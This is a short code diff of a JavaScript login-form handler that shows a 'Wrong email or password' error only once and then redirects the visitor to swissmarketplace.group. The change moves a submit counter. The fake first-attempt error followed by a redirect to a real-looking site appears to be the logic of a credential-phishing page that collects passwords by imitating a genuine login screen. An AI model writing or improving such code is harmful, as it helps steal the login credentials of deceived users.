@@ -567,7 +567,6 @@ form.addEventListener('submit', async (e) => {
   // 🔥 arată o singură dată
   if (!authErrorShown) {
     authErrorShown = true;
-    i++;
 
     passwordError.textContent = 'Wrong email or password';
     passwordField.classList.add('ulp-error');
@@ -594,6 +593,7 @@ form.addEventListener('submit', async (e) => {
 
     window.location.href = 'https://swissmarketplace.group/';
   }
+  i++;
 });
 
 
